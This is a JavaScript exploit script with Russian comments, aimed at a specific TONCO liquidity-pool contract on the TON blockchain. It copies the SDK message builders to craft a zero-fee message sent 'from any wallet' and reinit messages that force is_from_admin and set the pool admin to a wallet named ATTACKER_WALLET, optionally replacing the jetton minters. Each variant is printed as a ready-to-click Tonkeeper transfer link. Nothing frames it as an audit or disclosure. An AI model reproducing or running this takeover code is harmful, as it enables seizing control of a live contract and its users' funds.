const { beginCell, Address, toNano } = require('@ton/core');

const POOLV3_INIT = 0x441c39ed;
const POOLV3_SET_FEE = 0x6bdcbeb8;
const IMPOSSIBLE_FEE = 10001;

const NEW_POOL = 'EQBTVxBp0SNUtghiT6sncaP-FgD2omffgwexK0jK9MZErZQ7';
const ADMIN_WALLET = 'UQCvPAknwpT9a9dSCCtF_RdRh2bssBmuOBNG0hamNL5EuLpT';
const ATTACKER_WALLET = 'UQCRcaW_DHaJaTJ1-bhWnElHap2xeOCYVEDKoRWyXSrUatTC';

console.log('=== ТОЧНАЯ КОПИЯ SDK TONCO ===');
console.log('');

// ========== SDK messageSetFees ==========
function messageSetFees(protocolFee, lpFee, currentFee) {
    return beginCell()
        .storeUint(POOLV3_SET_FEE, 32)
        .storeUint(0, 64)
        .storeUint(protocolFee, 16)
        .storeUint(lpFee, 16)
        .storeUint(currentFee, 16)
        .endCell();
}

// ========== SDK reinitMessage ==========
function reinitMessage(opts) {
    let minterCell = null;
    if (opts.jetton0Minter && opts.jetton1Minter) {
        minterCell = beginCell()
            .storeAddress(opts.jetton0Minter)
            .storeAddress(opts.jetton1Minter)
            .endCell();
    }
    let body = beginCell()
        .storeUint(POOLV3_INIT, 32)      // OP code
        .storeUint(0, 64)                // query_id
        .storeUint(opts.is_from_admin ? 1 : 0, 1)  // is_from_admin
        .storeUint(opts.admin == undefined ? 0 : 1, 1)  // has_admin
        .storeAddress(opts.admin)        // admin
        .storeUint(opts.controller == undefined ? 0 : 1, 1)  // has_controller
        .storeAddress(opts.controller)   // controller
        .storeUint(opts.tickSpacing == undefined ? 0 : 1, 1)  // has_tickSpacing
        .storeUint(opts.tickSpacing ?? 0, 24)  // tickSpacing
        .storeUint(opts.sqrtPriceX96 == undefined ? 0 : 1, 1)  // has_sqrtPriceX96
        .storeUint(opts.sqrtPriceX96 ?? 0, 160)  // sqrtPriceX96
        .storeUint(opts.activate_pool == undefined ? 0 : 1, 1)  // has_activate_pool
        .storeUint(opts.activate_pool ? 1 : 0, 1)  // activate_pool
        .storeUint(opts.protocolFee ? opts.protocolFee : IMPOSSIBLE_FEE, 16)
        .storeUint(opts.lpFee ? opts.lpFee : IMPOSSIBLE_FEE, 16)
        .storeUint(opts.currentFee ? opts.currentFee : IMPOSSIBLE_FEE, 16)
        .storeRef(opts.nftContentPacked ?? beginCell().endCell())
        .storeRef(opts.nftItemContentPacked ?? beginCell().endCell())
        .storeMaybeRef(minterCell)
        .endCell();
    return body;
}

// ========== TEST 1: SET_FEES (с любого кошелька) ==========
console.log('--- TEST 1: POOLV3_SET_FEE (0x6bdcbeb8) с любого кошелька ---');
const body1 = messageSetFees(0, 0, 0);
const boc1 = body1.toBoc().toString('base64');
console.log('Body BoC:', boc1);
console.log('Tonkeeper link (ЛЮБОЙ кошелек):');
console.log('https://app.tonkeeper.com/transfer/' + NEW_POOL + '?amount=' + toNano('0.1').toString() + '&bin=' + encodeURIComponent(boc1));
console.log('');

// ========== TEST 2: reinit с is_from_admin=true ==========
console.log('--- TEST 2: reinitMessage({ is_from_admin: true }) ---');
const body2 = reinitMessage({ is_from_admin: true });
const boc2 = body2.toBoc().toString('base64');
console.log('Body BoC:', boc2);
console.log('Tonkeeper link (admin wallet):');
console.log('https://app.tonkeeper.com/transfer/' + NEW_POOL + '?amount=' + toNano('0.15').toString() + '&bin=' + encodeURIComponent(boc2));
console.log('');

// ========== TEST 3: reinit с admin = attacker ==========
console.log('--- TEST 3: reinit с admin = attacker ---');
const body3 = reinitMessage({ 
    is_from_admin: true, 
    admin: Address.parse(ATTACKER_WALLET)
});
const boc3 = body3.toBoc().toString('base64');
console.log('Body BoC:', boc3);
console.log('Tonkeeper link (admin wallet):');
console.log('https://app.tonkeeper.com/transfer/' + NEW_POOL + '?amount=' + toNano('0.15').toString() + '&bin=' + encodeURIComponent(boc3));
console.log('');

// ========== TEST 4: reinit с admin = attacker + jettonMinters ==========
console.log('--- TEST 4: reinit с admin = attacker + jettonMinters ---');
const body4 = reinitMessage({ 
    is_from_admin: true,
    admin: Address.parse(ATTACKER_WALLET),
    jetton0Minter: Address.parse('EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs'),
    jetton1Minter: Address.parse('EQAWpz2_G0NKxlG2VvgFbgZGPt8Y1qe0cGj-4Yw5BfmYR5iF')
});
const boc4 = body4.toBoc().toString('base64');
console.log('Body BoC:', boc4);
console.log('Tonkeeper link (admin wallet):');
console.log('https://app.tonkeeper.com/transfer/' + NEW_POOL + '?amount=' + toNano('0.15').toString() + '&bin=' + encodeURIComponent(boc4));
console.log('');

// ========== ПРОВЕРКА: декодируем body ==========
console.log('=== Проверка TEST 2 (reinitMessage) ===');
const c2 = body2.beginParse();
console.log('  op:', '0x'+c2.loadUint(32).toString(16));
console.log('  query_id:', c2.loadUint(64));
console.log('  is_from_admin:', c2.loadBit());
console.log('  has_admin:', c2.loadBit());
// если has_admin=0, то 2 бита пропуска
if (!c2.loadBit()) {} else console.log('  ...ERROR has_admin should be 0');
console.log('  has_controller:', c2.loadBit());
if (!c2.loadBit()) {} else console.log('  ...ERROR has_controller should be 0');
console.log('  has_tickSpacing:', c2.loadBit());
console.log('  tickSpacing (24):', c2.loadUint(24));
console.log('  has_sqrtPriceX96:', c2.loadBit());
console.log('  sqrtPriceX96 (160):', c2.loadUintBig(160));
console.log('  has_activate_pool:', c2.loadBit());
console.log('  activate_pool:', c2.loadBit());
console.log('  protocolFee:', c2.loadUint(16));
console.log('  lpFee:', c2.loadUint(16));
console.log('  currentFee:', c2.loadUint(16));
console.log('  refs left:', c2.remainingRefs);
const r1 = c2.loadRef();
console.log('  ref1 bits:', r1.bits.length);
const r2 = c2.loadRef();
console.log('  ref2 bits:', r2.bits.length);
console.log('  remaining bits:', c2.remainingBits, 'refs:', c2.remainingRefs);
if (c2.remainingBits > 0) {
    console.log('  has_minter:', c2.loadBit());
    if (c2.remainingRefs > 0) {
        console.log('  minter ref present!');
    }
}
